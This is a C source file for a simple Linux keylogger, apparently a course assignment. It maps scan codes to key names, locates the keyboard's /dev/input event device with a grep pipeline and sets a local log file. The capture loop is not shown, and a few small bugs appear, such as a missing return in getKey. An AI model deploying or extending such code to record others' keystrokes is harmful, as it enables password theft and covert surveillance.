#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>

#include "opt.h"

#define unknownKey UnknownKey

//defining a funtion-like Macro
#define arraySize(arr) (sizeof(arr)/sizeof(arr[0]))

//static function prototype
static char *getFileName();

//defining the keyboard keys on my laptop
static char *keys[] = {
   unknownKey, "ESC",
   "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
   "Backspace", "Tab",
   "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
   "[", "]", "Enter", "LCtrl",
   "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
   "'", "`", "LShift",
   "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
   "RShift",
   "keyPad*",
   "LAlt", " ", "CapsLock",
   "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
   "NumLock", "ScrollLock",
   "keyPad7", "keyPad8", "keyPad9",
   "keyPad-",
   "keyPad4", "keyPad5", "keyPad6",
   "keyPad+",
   "keyPad1", "keyPad2", "keyPad3", "keyPad0",
   "keyPad.",
   unknownKey, unknownKey, unknownKey,
   "F11", "F12",
   unknownKey, unknownKey, unknownKey, unknownKey, unknownKey, unknownKey, unknownKey,
   "keyPadEnter", "RCtrl", "keyPad/", "SysRq", "RAlt", unknownKey,
   "Home", "Up", "PageUp", "Left", "Right", "End", "Down",
   "PageDown", "Insert", "Delete"
};


//key inputs when a shift key is pressed
static char *shift_keys[] = {
   unknownKey, "ESC",
   "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
   "Backspace", "Tab",
   "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
   "{", "}", "Enter", "LCtrl",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
   "\"", "~", "LShift",
   "|", "Z", "X", "C", "V", "B", "N", "M", "", "", "?",
   "RShift",
   "keyPad*",
   "LAlt", " ", "CapsLock",
   "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
   "NumLock", "ScrollLock",
   "keyPad7", "keyPad8", "keyPad9",
   "keyPad-",
   "keyPad4", "keyPad5", "keyPad6",
   "keyPad+",
   "keyPad1", "keyPad2", "keyPad3", "keyPad0",
   "keyPad.",
   unknownKey, unknownKey, unknownKey,
   "F11", "F12",
   unknownKey, unknownKey, unknownKey, unknownKey, unknownKey, unknownKey, unknownKey,
   "keyPadEnter", "RCtrl", "keyPad/", "SysRq", "RAlt", unknownKey,
   "Home", "Up", "PageUp", "Left", "Right", "End", "Down",
   "PageDown", "Insert", "Delete"
};

#undef unknownKey

//Menu shortcuts
static const char shortOpt[] = "h,v";
static struct option longOpt[] = {
   {"help",    no_argument,         0, 'h'},
   {"version", no_argument,         0, 'v'},
   {   0,             0,            0,  0 }
};

/*
 * Detects and returns the name of the keyboard device file.
*/
static char *getFileName(){
   
   //run command for the file
   static const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices |" "grep -B1 120013 |" "grep -Eo event[0-9]+ |" "tr '\\n' '\\0'";
  
   FILE *pipe = popen(command, "r");
   if (pipe == NULL) {
      printf("Could not determine keyboard device file");
   }

   char result[20] = "/dev/input/";
   char temp[9];
   
   fgets(temp, 9, pipe); //fgets reading a line from pipe stream and storing it in to the temp 

   pclose(pipe);
   return strdup(strcat(result, temp));
}

void parseOpt(int argc, char **argv, Configuration *configuration){

   configuration->specialFile = getFileName();
   configuration->myLogFile = "/home/student/Documents/comp3000/keyLogger/newKeyLogger/keyLogger.log"; //creating a new log file at the specific destination

   int index;
   int opt = 0;
   
   while (opt != -1){
      
      opt = getopt_long(argc, argv, shortOpt, longOpt, &index);

      switch (opt){
         
         case 'h':

               printf("%s\n", "\nkeyLogger Options\n\n"

                  "Logs pressed keys\n\n"
                  
                     " --h, -Help Menu\t\tDisplays this help message\n"
                  
                     " --v, -Software Version\t\tDisplays version information\n");

               exit(0);
         break;
      
         case 'v':

               printf("\nSimple Key Logger version: \n\n**********FINAL********** \n\n ");
            
               exit(0);

         break;
      
         case '?':
         
         break;
      }
   }
}


bool boolShift(int shiftKey){   
   return shiftKey == KEY_LEFTSHIFT || shiftKey == KEY_RIGHTSHIFT;
}

char *getKey(int shiftKey, int shiftCheck){
   
   //Assemble(arraySize(keys) == arraySize(shift_keys));
   char **arr;
   
   if (shiftCheck != 0){
      arr = shift_keys; //this arr will point towards shift_keys char
   }else{
      arr = keys;
   }

   if (shiftKey < arraySize(keys)){
      return arr[shiftKey];
   }
}